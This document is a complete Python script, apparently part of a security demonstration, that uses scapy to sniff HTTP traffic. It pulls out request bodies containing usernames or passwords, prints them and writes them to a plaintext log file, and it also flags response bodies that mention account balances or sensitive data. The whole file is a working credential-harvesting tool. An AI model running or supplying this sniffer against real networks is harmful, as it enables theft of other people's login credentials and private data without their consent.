# network_sniffer.py
"""
Network Packet Sniffer for HTTP Traffic
Demonstrates MITM attack capabilities
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

try:
    from scapy.all import sniff, IP, TCP, Raw
    from scapy.layers.http import HTTPRequest, HTTPResponse
except ImportError:
    print("ERROR: scapy not installed. Install: pip install scapy")
    sys.exit(1)

from colorama import Fore, Style, init

init(autoreset=True)


class NetworkSniffer:
    """Sniff and analyze network packets"""

    def __init__(self, interface=None, port=None, filter_protocol='tcp'):
        self.interface = interface
        self.port = port
        self.filter_protocol = filter_protocol
        self.captured_packets = []
        self.credentials_found = []

    def build_filter(self):
        """Build packet filter string"""
        filters = [self.filter_protocol]

        if self.port:
            filters.append(f"port {self.port}")

        return " and ".join(filters)

    def packet_callback(self, packet):
        """Process captured packet"""
        try:
            # Check if packet has HTTP request
            if packet.haslayer(HTTPRequest):
                http_request = packet[HTTPRequest]

                print(f"\n{Fore.GREEN}[HTTP REQUEST CAPTURED]{Style.RESET_ALL}")
                print(f"  Method: {http_request.Method.decode()}")
                print(f"  Host: {http_request.Host.decode()}")
                print(f"  Path: {http_request.Path.decode()}")

                # Extract payload
                if http_request.haslayer(Raw):
                    payload = http_request[Raw].load.decode('utf-8', errors='ignore')

                    # Look for credentials
                    if 'username' in payload or 'password' in payload:
                        print(f"{Fore.RED}[⚠️  CREDENTIALS DETECTED!]{Style.RESET_ALL}")
                        print(f"  Payload: {payload}")
                        self.credentials_found.append(payload)

                        # Log to file
                        with open('logs/captured_http_traffic.log', 'a') as f:
                            f.write(f"[CREDENTIALS] {payload}\n")

            # Check if packet has HTTP response
            elif packet.haslayer(HTTPResponse):
                http_response = packet[HTTPResponse]

                print(f"\n{Fore.BLUE}[HTTP RESPONSE CAPTURED]{Style.RESET_ALL}")
                print(f"  Status Code: {http_response.Status_Code.decode()}")

                # Extract response body
                if http_response.haslayer(Raw):
                    body = http_response[Raw].load.decode('utf-8', errors='ignore')

                    if 'Account Balance' in body or 'Sensitive' in body:
                        print(f"{Fore.YELLOW}[SENSITIVE DATA DETECTED!]{Style.RESET_ALL}")
                        print(f"  Data: {body[:100]}...")

            self.captured_packets.append(packet)

        except Exception as e:
            pass

    def start_sniffing(self):
        """Start capturing packets"""
        print("=" * 70)
        print("NETWORK PACKET SNIFFER - MITM DEMONSTRATION")
        print("=" * 70)

        Path('logs').mkdir(exist_ok=True)

        # Build filter
        pkt_filter = self.build_filter()

        print(f"\n[*] Starting packet capture...")
        print(f"[*] Filter: {pkt_filter}")
        if self.interface:
            print(f"[*] Interface: {self.interface}")
        print(f"[⚠️  Press Ctrl+C to stop]\n")

        try:
            sniff(
                iface=self.interface,
                prn=self.packet_callback,
                filter=pkt_filter,
                store=False
            )

        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[*] Packet capture stopped{Style.RESET_ALL}")
            self.print_statistics()

        except PermissionError:
            print(f"{Fore.RED}[✗] ERROR: Root/Administrator privileges required!{Style.RESET_ALL}")
            print("[*] Run with: sudo python network_sniffer.py")

        except Exception as e:
            print(f"{Fore.RED}[✗] ERROR: {e}{Style.RESET_ALL}")

    def print_statistics(self):
        """Print sniffing statistics"""
        print("\n" + "=" * 70)
        print("SNIFFING STATISTICS")
        print("=" * 70)

        print(f"\nTotal packets captured: {len(self.captured_packets)}")
        print(f"Credentials captured: {len(self.credentials_found)}")

        if self.credentials_found:
            print(f"\n{Fore.RED}[⚠️  CAPTURED CREDENTIALS]{Style.RESET_ALL}")
            for creds in self.credentials_found:
                print(f"  {creds}")


def main():
    """Main execution"""
    import argparse

    parser = argparse.ArgumentParser(
        description='Network packet sniffer for HTTP traffic analysis'
    )
    parser.add_argument(
        '--interface', '-i',
        help='Network interface to sniff on (e.g., eth0, wlan0)'
    )
    parser.add_argument(
        '--port', '-p',
        type=int,
        help='Port to filter (e.g., 8000 for HTTP)'
    )

    args = parser.parse_args()

    sniffer = NetworkSniffer(interface=args.interface, port=args.port)
    sniffer.start_sniffing()


if __name__ == "__main__":
    main()
